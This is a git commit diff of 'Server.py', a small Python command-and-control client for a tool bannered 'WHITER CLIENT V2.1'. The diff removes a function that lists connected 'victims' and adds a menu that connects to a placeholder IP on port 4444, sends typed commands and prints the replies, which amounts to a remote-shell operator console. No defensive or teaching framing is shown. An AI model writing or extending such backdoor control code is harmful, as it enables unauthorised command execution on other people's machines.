40eb47f456277298576fce188218b592e373c6be
Jhon <vicentinreidelas0@gmail.com>
2025-04-22 15:39:41 -0300

    Update Server.py

--- Server.py
+++ Server.py
@@ -1,10 +1,8 @@
 import socket
-import threading
 
-HOST = 'SEU_IP_AQUI'  # Substitua pelo IP do servidor
+HOST = 'SEU_IP_AQUI'
 PORT = 4444
 
-# Função para mostrar o banner
 def banner():
     print("""
 ██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
@@ -13,10 +11,31 @@ def banner():
 ██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
 ╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    
-     W H I T E R   C L I E N T   V2
+     W H I T E R   C L I E N T   V2.1
 """)
 
-# Função para listar vítimas conectadas
-def listar_vitimas(clientes):
-    print("\n[ VÍTIMAS CONECTADAS ]")
-    for i, (conn,
+def menu():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((HOST, PORT))
+    print(s.recv(2048).decode())
+
+    while True:
+        print("\n[ MENU ]")
+        print("1 - Enviar comando")
+        print("2 - Sair")
+        op = input("> ")
+
+        if op == "1":
+            comando = input("Comando > ")
+            s.send(comando.encode())
+            resposta = s.recv(4096).decode()
+            print(resposta)
+        elif op == "2":
+            s.send(b"exit")
+            break
+        else:
+            print("Opção inválida.")
+    s.close()
+
+banner()
+menu()
